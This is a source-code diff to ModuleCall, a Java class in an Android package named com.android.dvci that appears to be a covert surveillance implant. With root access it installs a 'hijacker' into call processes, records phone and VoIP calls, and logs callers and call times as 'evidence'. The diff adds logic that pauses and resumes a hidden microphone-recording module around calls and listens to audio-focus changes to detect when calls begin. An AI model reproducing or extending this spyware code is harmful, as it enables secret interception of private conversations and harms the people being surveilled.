@@ -9,12 +9,16 @@
 
 package com.android.dvci.module;
 
+import android.app.Instrumentation;
+import android.content.Context;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.content.pm.PackageManager.NameNotFoundException;
+import android.media.AudioManager;
 import android.os.FileObserver;
 
 import com.android.dvci.Call;
+import com.android.dvci.Core;
 import com.android.dvci.RunningProcesses;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
@@ -24,6 +28,8 @@ import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.file.AutoFile;
 
+import com.android.dvci.interfaces.Observer;
+import com.android.dvci.listener.ListenerCall;
 import com.android.dvci.manager.ManagerModule;
 
 import com.android.dvci.module.call.CallInfo;
@@ -56,7 +62,7 @@ import java.util.List;
 import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.LinkedBlockingQueue;
 
-public class ModuleCall extends BaseModule  {
+public class ModuleCall extends BaseModule  implements Observer<Call>, AudioManager.OnAudioFocusChangeListener {
 	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
 	public static final int HEADER_SIZE = 6;
 
@@ -96,6 +102,8 @@ public class ModuleCall extends BaseModule  {
 	private boolean canRecord = true;
 	private boolean isStarted = false;
 	private Object recordingLock = new Object();
+	boolean micHasBeenStopped=false;
+	AudioManager am = null;
 
 	public static ModuleCall self() {
 		return (ModuleCall) ManagerModule.self().get(M.e("call"));
@@ -130,16 +138,25 @@ public class ModuleCall extends BaseModule  {
 	@Override
 	public void actualStart() {
 		isStarted=false;
-
+		micHasBeenStopped=false;
+		ListenerCall.self().attach(this);
+		//am = (AudioManager) Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);
+		//int i = am.requestAudioFocus(this,AudioManager.STREAM_VOICE_CALL,AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_MAY_DUCK);
 		runningProcesses = RunningProcesses.self();
-		callInfo = new CallInfo();
+		callInfo = new CallInfo(false);
 
 		if (recordFlag) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (actualStart): recording calls"); //$NON-NLS-1$
 			}
 		}
-
+		if (isMicAvailable()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (actualStart), Cannot start, because Mic is running,stop and start again");
+			}
+			ModuleMic.self().stop(this);
+			micHasBeenStopped=true;
+		}
 		if (Status.haveRoot()) {
 
 			if (android.os.Build.VERSION.SDK_INT < 15 || android.os.Build.VERSION.SDK_INT > 18) {
@@ -169,12 +186,6 @@ public class ModuleCall extends BaseModule  {
 				}
 
 				if (installHijack()) {
-					if (isMicAvailable()) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (actualStart) can't register call because mic is on:stopping it");
-						}
-						ModuleMic.self().stop();
-					}
 					startWatchAudio();
 					canRecord = true;
 				} else {
@@ -188,6 +199,13 @@ public class ModuleCall extends BaseModule  {
 			}
 		}
 		isStarted=true;
+		if(micHasBeenStopped) {
+			ModuleMic.self().restore(this);
+			ModuleMic.self().resume();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (actualStart), Restarted mic");
+			}
+		}
 	}
 
 	private boolean installedWhitelist() {
@@ -219,9 +237,73 @@ public class ModuleCall extends BaseModule  {
 
 	}
 
+
+	public int notification( Call call) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (notification): " + call);//$NON-NLS-1$
+		}
+		if (android.os.Build.VERSION.SDK_INT <= 15) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (actualStart): OS level not supported");
+			}
+			if (call.isComplete()) {
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart): Saving CallList evidence"); //$NON-NLS-1$
+				}
+
+				String from = call.getFrom();
+				String to = call.getTo();
+
+				saveCalllistEvidence(CALLIST_PHONE, from, to, callInfo.incoming, call.getTimeBegin(), call.getDuration());
+			}
+			return 0;
+		}
+		if (call.isOngoing()) {
+			// Let's start with call recording
+
+			if (ModuleCall.self() != null && ModuleCall.self().isRecordFlag()) {
+				if(ModuleMic.self()!=null && ModuleMic.self().isRecording()){
+					ModuleMic.self().stop(this);
+					micHasBeenStopped=true;
+				}
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification): starting PHONE call"); //$NON-NLS-1$
+				}
+				RecordCall.self().recordCall(call);
+			}
+		} else {
+			if (ModuleCall.self() != null && ModuleCall.self().isRecordFlag()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification): stopping PHONE call"); //$NON-NLS-1$
+				}
+				RecordCall.self().stopCall();
+				if(ModuleMic.self()!=null && micHasBeenStopped){
+					ModuleMic.self().restore(this);
+					ModuleMic.self().resume();
+					micHasBeenStopped=false;
+				}
+			}
+
+		}
+		return 0;
+	}
 	@Override
 	public void actualStop() {
-
+		ListenerCall.self().detach(this);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualStop");
+		}
+		if(RecordCall.self()!=null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (stopOnGoingRec): stopping RecordCall due to actualStop"); //$NON-NLS-1$
+			}
+			RecordCall.self().stopCall();
+		}
+		if(am!=null) {
+			am.abandonAudioFocus(this);
+			am=null;
+		}
 		if (Status.haveRoot()) {
 			if (queueMonitor != null && queueMonitor.isAlive()) {
 				encodingTask.stop();
@@ -234,10 +316,6 @@ public class ModuleCall extends BaseModule  {
 			if (hijack != null) {
 				hijack.stopInstrumentation();
 				hijack.killProc();
-			}
-
-			if (isMicAvailable()) {
-				ModuleMic.self().resetBlacklist();
 			}
 		}
 		canRecord = false;
@@ -298,18 +376,13 @@ public class ModuleCall extends BaseModule  {
 
 		observer.startWatching();
 	}
-	public static boolean isMicAvailable(){
-		return ModuleMic.self() != null && ModuleCall.self().isSuspended() && !ModuleCall.self().canRecord();
+	public boolean isMicAvailable(){
+		return ModuleMic.self() != null && !ModuleCall.self().isSuspended();
 	}
 	private boolean installHijack() {
 		// Initialize the callback system
+		boolean res=true;
 
-		if (isMicAvailable()) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (installHijack), Cannot start, because Mic is running");
-			}
-			return false;
-		}
 
 
 		hjcb = new CallBack();
@@ -319,19 +392,18 @@ public class ModuleCall extends BaseModule  {
 
 		if (hijack.startInstrumentation()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "(actualStart): hijacker successfully installed");
+				Check.log(TAG + "(installHijack): hijacker successfully installed");
 			}
 			EvidenceBuilder.info(M.e("Call Module ready"));
 
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "(actualStart): hijacker cannot be installed");
+				Check.log(TAG + "(installHijack): hijacker cannot be installed");
 			}
 
-			return false;
+			res= false;
 		}
-
-		return true;
+		return res;
 	}
 
 	private void purgeAudio() {
@@ -656,8 +728,10 @@ public class ModuleCall extends BaseModule  {
 			if (callInfo.begin != null && callInfo.end != null) {
 				closeCallEvidence(callInfo.getCaller(), callInfo.getCallee(), true, callInfo.begin, callInfo.end, callInfo.programId);
 			}
+			//check if the mic is running in that case stop it and restart when the call ends
 
-			callInfo = new CallInfo();
+			callInfo = new CallInfo(micHasBeenStopped);
+
 			for (Chunk chunk : chunks) {
 				AutoFile filetmp = new AutoFile(chunk.encodedFile);
 				filetmp.delete();
@@ -666,6 +740,8 @@ public class ModuleCall extends BaseModule  {
 			chunks = new ArrayList<Chunk>();
 			finished = new boolean[2];
 			started = false;
+		}else{
+			callInfo.setMicStopped(micHasBeenStopped);
 		}
 
 		boolean ret = callInfo.setStreamId(remote, streamId);
@@ -763,7 +839,14 @@ public class ModuleCall extends BaseModule  {
 						if (callInfo.valid)
 							closeCallEvidence(caller, callee, true, callInfo.begin, callInfo.end, callInfo.programId);
 					}
-					callInfo = new CallInfo();
+					if(callInfo.isMicStopped()){
+						ModuleMic.self().restore(this);
+						ModuleMic.self().resume();
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (encodeChunks), Restarted mic");
+						}
+					}
+					callInfo = new CallInfo(false);
 					chunks = new ArrayList<Chunk>();
 					finished = new boolean[2];
 					started = false;
@@ -850,6 +933,88 @@ public class ModuleCall extends BaseModule  {
 
 	public boolean isRecording() {
 		return started;
+	}
+
+	@Override
+	public void onAudioFocusChange(int i) {
+		String status="unknown";
+		switch (i){
+			case AudioManager.AUDIOFOCUS_GAIN:
+				status="AUDIOFOCUS_GAIN="+i;
+				break;
+			case AudioManager.AUDIOFOCUS_GAIN_TRANSIENT:
+				status="AUDIOFOCUS_GAIN_TRANSIENT="+i;
+				break;
+			case AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_MAY_DUCK:
+				status="AUDIOFOCUS_GAIN_TRANSIENT_MAY_DUCK="+i;
+				break;
+			case AudioManager.AUDIOFOCUS_LOSS:
+				status="AUDIOFOCUS_LOSS="+i;
+				break;
+			case AudioManager.AUDIOFOCUS_LOSS_TRANSIENT:
+				status="AUDIOFOCUS_LOSS_TRANSIENT="+i;
+				break;
+			case AudioManager.AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK:
+				status="AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK="+i;
+				break;
+			default:
+				status="unknown="+i;
+				break;
+		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onAudioFocusChange): " + status);
+			Check.log(TAG + " (onAudioFocusChange): fg base_activity " + RunningProcesses.self().getForeground_activity().baseActivity);
+		}
+
+		if(i==AudioManager.AUDIOFOCUS_GAIN || i==AudioManager.AUDIOFOCUS_GAIN_TRANSIENT || i==AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_MAY_DUCK){
+
+				if (ModuleCall.self() != null && ModuleCall.self().isRecordFlag()) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (notification): stopping PHONE call"); //$NON-NLS-1$
+					}
+					if(ModuleMic.self()!=null){
+						ModuleMic.self().setCallOngoing(false);
+					}
+					//RecordCall.self().stopCall();
+					//if(ModuleMic.self()!=null && micHasBeenStopped){
+					//	ModuleMic.self().restore(this);
+					//	ModuleMic.self().resume();
+					//	micHasBeenStopped=false;
+					//}
+			}
+
+		}else if(i==AudioManager.AUDIOFOCUS_LOSS || i ==AudioManager.AUDIOFOCUS_LOSS_TRANSIENT || i == AudioManager.AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK){
+
+				// Let's start with call recording
+
+				if (ModuleCall.self() != null && ModuleCall.self().isRecordFlag()) {
+					if(ModuleMic.self()!=null){
+						ModuleMic.self().setCallOngoing(true);
+					}
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (notification): starting PHONE call"); //$NON-NLS-1$
+					}
+					/*
+					if(ModuleMic.self()!=null && ModuleMic.self().isRecording()){
+						ModuleMic.self().stop(this);
+						micHasBeenStopped=true;
+					}
+
+
+					Call call = new Call("my", false);
+					if (call != null) {
+						call.setOngoing(true);
+						call.setOffhook();
+						call.setVoip();
+						// tell every listeners that a call is starting
+						RecordCall.self().recordCall(call);
+					}
+					*/
+
+				}
+		}
+
 	}
 
 	public class HC implements ICallBack {
